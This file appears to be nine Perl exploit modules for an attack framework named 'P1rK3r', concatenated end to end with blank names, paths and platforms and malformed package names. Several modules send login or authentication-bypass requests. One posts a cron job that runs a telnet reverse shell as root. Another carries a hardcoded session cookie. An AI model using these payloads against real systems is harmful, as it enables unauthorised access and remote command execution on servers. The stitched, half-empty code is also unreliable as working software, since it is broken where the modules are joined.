package MSFPerlExploits::::MSF::;
use parent qw(P1rK3r::Exploit P1rK3r::Services::);use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use URI::URL;
use Data::Dump qw(dump);
use Coro qw( async );

use P1rK3r::Functions::Basic;
use P1rK3r::Functions::Errors;
use P1rK3r::Functions::Content;

sub load {
    my $type  = shift;
    my $class = ref $type || $type;
    my $self = { };
    bless $self, $class;

    return $self;
}

sub new {
   my $class = shift;
   my ( $requester, $database ) = @_;

   my $name = "";

   my $DETECTION = {

   };

   my $EXPLOIT = {

        NAME => '',
        TYPE => 'MSF',
        PLATFORM => '',
        REQUESTS => {
                EXPLOIT1 => {
                        METHOD       => 'POST',
                        PATH         => '',
                        PAYLOAD      => 'method=login&adminpassword=&rdsPasswordAllowed=1',
                        TEXT         => 'Sending First Exploit Request On : ',
                        HEADERS      => {
                           'Content-Type' => 'application/x-www-form-urlencoded',
                        },
                        VALIDATION   => {
                           TCODE => ['200'],
                        },
                },
        },
   };

   return $class->SUPER::new($requester, $database, $name, $DETECTION, $EXPLOIT, @_);
}

return 1;package MSFPerlExploits::::MSF::;
use parent qw(P1rK3r::Exploit P1rK3r::Services::);use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use URI::URL;
use Data::Dump qw(dump);
use Coro qw( async );

use P1rK3r::Functions::Basic;
use P1rK3r::Functions::Errors;
use P1rK3r::Functions::Content;

sub load {
    my $type  = shift;
    my $class = ref $type || $type;
    my $self = { };
    bless $self, $class;

    return $self;
}

sub new {
   my $class = shift;
   my ( $requester, $database ) = @_;

   my $name = "";

   my $DETECTION = {

   };

   my $EXPLOIT = {

        NAME => '',
        TYPE => 'MSF',
        PLATFORM => '',
        REQUESTS => {
                EXPLOIT1 => {
                        METHOD       => 'GET',
                        PATH         => '',
                        PAYLOAD      => '',
                        TEXT         => 'Sending First Exploit Request On : ',
                        HEADERS      => {
                           'Content-Type' => 'application/x-www-form-urlencoded',
                        },
                        VALIDATION   => {
                           TCODE => ['200'],
                        },
                },
        },
   };

   return $class->SUPER::new($requester, $database, $name, $DETECTION, $EXPLOIT, @_);
}

return 1;package MSFPerlExploits::::MSF::;
use parent qw(P1rK3r::Exploit P1rK3r::Services::);use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use URI::URL;
use Data::Dump qw(dump);
use Coro qw( async );

use P1rK3r::Functions::Basic;
use P1rK3r::Functions::Errors;
use P1rK3r::Functions::Content;

sub load {
    my $type  = shift;
    my $class = ref $type || $type;
    my $self = { };
    bless $self, $class;

    return $self;
}

sub new {
   my $class = shift;
   my ( $requester, $database ) = @_;

   my $name = "";

   my $DETECTION = {

   };

   my $EXPLOIT = {

        NAME => '',
        TYPE => 'MSF',
        PLATFORM => '',
        REQUESTS => {
                EXPLOIT1 => {
                        METHOD       => 'POST',
                        PATH         => '',
                        PAYLOAD      => 'username=__USERNAME__&password=__PASSWORD__',
                        TEXT         => 'Sending First Exploit Request On : ',
                        HEADERS      => {
                           'Cookie' => '',
                           'Content-Type' => 'application/x-www-form-urlencoded',
                        },
                        VALIDATION   => {
                           TCODE => ['200'],
                        },
                },
        },
   };

   return $class->SUPER::new($requester, $database, $name, $DETECTION, $EXPLOIT, @_);
}

return 1;package MSFPerlExploits::::MSF::;
use parent qw(P1rK3r::Exploit P1rK3r::Services::);use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use URI::URL;
use Data::Dump qw(dump);
use Coro qw( async );

use P1rK3r::Functions::Basic;
use P1rK3r::Functions::Errors;
use P1rK3r::Functions::Content;

sub load {
    my $type  = shift;
    my $class = ref $type || $type;
    my $self = { };
    bless $self, $class;

    return $self;
}

sub new {
   my $class = shift;
   my ( $requester, $database ) = @_;

   my $name = "";

   my $DETECTION = {

   };

   my $EXPLOIT = {

        NAME => '',
        TYPE => 'MSF',
        PLATFORM => '',
        REQUESTS => {
                EXPLOIT1 => {
                        METHOD       => 'GET',
                        PATH         => '',
                        PAYLOAD      => '',
                        TEXT         => 'Sending First Exploit Request On : ',
                        HEADERS      => {
                           'Content-Type' => 'application/x-www-form-urlencoded',
                        },
                        VALIDATION   => {
                           TCODE => ['200'],
                        },
                },
        },
   };

   return $class->SUPER::new($requester, $database, $name, $DETECTION, $EXPLOIT, @_);
}

return 1;package MSFPerlExploits::::MSF::;
use parent qw(P1rK3r::Exploit P1rK3r::Services::);use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use URI::URL;
use Data::Dump qw(dump);
use Coro qw( async );

use P1rK3r::Functions::Basic;
use P1rK3r::Functions::Errors;
use P1rK3r::Functions::Content;

sub load {
    my $type  = shift;
    my $class = ref $type || $type;
    my $self = { };
    bless $self, $class;

    return $self;
}

sub new {
   my $class = shift;
   my ( $requester, $database ) = @_;

   my $name = "";

   my $DETECTION = {

   };

   my $EXPLOIT = {

        NAME => '',
        TYPE => 'MSF',
        PLATFORM => '',
        REQUESTS => {
                EXPLOIT1 => {
                        METHOD       => 'POST',
                        PATH         => '',
                        PAYLOAD      => '{"service":"Authentication","method":"login","params":{"username":"__USERNAME__","password":"__PASSWORD__"}}',
                        TEXT         => 'Sending First Exploit Request On : ',
                        HEADERS      => {
                           'Cookie' => '',
                           'Content-Type' => 'application/json',
                        },
                        VALIDATION   => {
                           TCODE => ['200'],
                        },
                },
        },
   };

   return $class->SUPER::new($requester, $database, $name, $DETECTION, $EXPLOIT, @_);
}

return 1;package MSFPerlExploits::::MSF::;
use parent qw(P1rK3r::Exploit P1rK3r::Services::);use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use URI::URL;
use Data::Dump qw(dump);
use Coro qw( async );

use P1rK3r::Functions::Basic;
use P1rK3r::Functions::Errors;
use P1rK3r::Functions::Content;

sub load {
    my $type  = shift;
    my $class = ref $type || $type;
    my $self = { };
    bless $self, $class;

    return $self;
}

sub new {
   my $class = shift;
   my ( $requester, $database ) = @_;

   my $name = "";

   my $DETECTION = {

   };

   my $EXPLOIT = {

        NAME => '',
        TYPE => 'MSF',
        PLATFORM => '',
        REQUESTS => {
                EXPLOIT1 => {
                        METHOD       => 'POST',
                        PATH         => '',
                        PAYLOAD      => '{"service":"Cron","method":"set","params":{"enable":true,"minute":"*","hour":"*","dayofmonth":"*","month":"*","dayofweek":"*","username":"root","command":"sh -c '(sleep 4335|telnet 127.0.0.1 4592|while : ; do sh && break; done 2>&1|telnet 127.0.0.1 4592 >/dev/null 2>&1 &)'","comment":"","type":"userdefined","everynminute":false,"everynhour":false,"everyndayofmonth":false,"sendemail":false,"uuid":"undefined"}}',
                        TEXT         => 'Sending First Exploit Request On : ',
                        HEADERS      => {
                           'Cookie' => '',
                           'Content-Type' => 'application/json',
                        },
                        VALIDATION   => {
                           TCODE => ['200'],
                        },
                },
        },
   };

   return $class->SUPER::new($requester, $database, $name, $DETECTION, $EXPLOIT, @_);
}

return 1;package MSFPerlExploits::::MSF::;
use parent qw(P1rK3r::Exploit P1rK3r::Services::);use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use URI::URL;
use Data::Dump qw(dump);
use Coro qw( async );

use P1rK3r::Functions::Basic;
use P1rK3r::Functions::Errors;
use P1rK3r::Functions::Content;

sub load {
    my $type  = shift;
    my $class = ref $type || $type;
    my $self = { };
    bless $self, $class;

    return $self;
}

sub new {
   my $class = shift;
   my ( $requester, $database ) = @_;

   my $name = "";

   my $DETECTION = {

   };

   my $EXPLOIT = {

        NAME => '',
        TYPE => 'MSF',
        PLATFORM => '',
        REQUESTS => {
                EXPLOIT1 => {
                        METHOD       => 'GET',
                        PATH         => '',
                        PAYLOAD      => '',
                        TEXT         => 'Sending First Exploit Request On : ',
                        HEADERS      => {
                           'Content-Type' => 'application/x-www-form-urlencoded',
                        },
                        VALIDATION   => {
                           TCODE => ['200'],
                        },
                },
        },
   };

   return $class->SUPER::new($requester, $database, $name, $DETECTION, $EXPLOIT, @_);
}

return 1;package MSFPerlExploits::::MSF::;
use parent qw(P1rK3r::Exploit P1rK3r::Services::);use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use URI::URL;
use Data::Dump qw(dump);
use Coro qw( async );

use P1rK3r::Functions::Basic;
use P1rK3r::Functions::Errors;
use P1rK3r::Functions::Content;

sub load {
    my $type  = shift;
    my $class = ref $type || $type;
    my $self = { };
    bless $self, $class;

    return $self;
}

sub new {
   my $class = shift;
   my ( $requester, $database ) = @_;

   my $name = "";

   my $DETECTION = {

   };

   my $EXPLOIT = {

        NAME => '',
        TYPE => 'MSF',
        PLATFORM => '',
        REQUESTS => {
                EXPLOIT1 => {
                        METHOD       => 'POST',
                        PATH         => '',
                        PAYLOAD      => 'form%5bUSR_PASSWORD%5d=__PASSWORD__&form%5bUSR_USERNAME%5d=__USERNAME__',
                        TEXT         => 'Sending First Exploit Request On : ',
                        HEADERS      => {
                           'Cookie' => 'PHPSESSID=X3dGrBzNPSzyI6EZ;',
                           'Content-Type' => 'application/x-www-form-urlencoded',
                        },
                        VALIDATION   => {
                           TCODE => ['200'],
                        },
                },
        },
   };

   return $class->SUPER::new($requester, $database, $name, $DETECTION, $EXPLOIT, @_);
}

return 1;package MSFPerlExploits::::MSF::;
use parent qw(P1rK3r::Exploit P1rK3r::Services::);use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use URI::URL;
use Data::Dump qw(dump);
use Coro qw( async );

use P1rK3r::Functions::Basic;
use P1rK3r::Functions::Errors;
use P1rK3r::Functions::Content;

sub load {
    my $type  = shift;
    my $class = ref $type || $type;
    my $self = { };
    bless $self, $class;

    return $self;
}

sub new {
   my $class = shift;
   my ( $requester, $database ) = @_;

   my $name = "";

   my $DETECTION = {

   };

   my $EXPLOIT = {

        NAME => '',
        TYPE => 'MSF',
        PLATFORM => '',
        REQUESTS => {
                EXPLOIT1 => {
                        METHOD       => 'POST',
                        PATH         => '',
                        PAYLOAD      => 'username=__USERNAME__&password=__PASSWORD__',
                        TEXT         => 'Sending First Exploit Request On : ',
                        HEADERS      => {
                           'Content-Type' => 'application/x-www-form-urlencoded',
                        },
                        VALIDATION   => {
                           TCODE => ['200'],
                        },
                },
        },
   };

   return $class->SUPER::new($requester, $database, $name, $DETECTION, $EXPLOIT, @_);
}

return 1;